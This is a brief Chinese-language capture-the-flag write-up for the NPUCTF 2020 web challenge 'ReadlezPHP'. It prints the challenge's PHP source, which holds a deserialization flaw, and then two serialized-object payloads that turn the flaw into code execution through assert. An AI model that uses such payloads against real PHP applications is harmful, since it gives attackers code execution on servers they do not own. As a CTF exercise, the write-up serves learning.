# NPUCTF 2020

## Web

### ReadlezPHP

查看源代码可以发现 a 标签 `<a href="./time.php?source"></a>` ，访问后可以得到如下代码。

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

通过构造 Payload 如下

```
data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:4:"eval";}
```

回显 `500` ，估计被过滤了，修改 Payload 如下

```
data=O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}
```

就可以找到 flag 了。
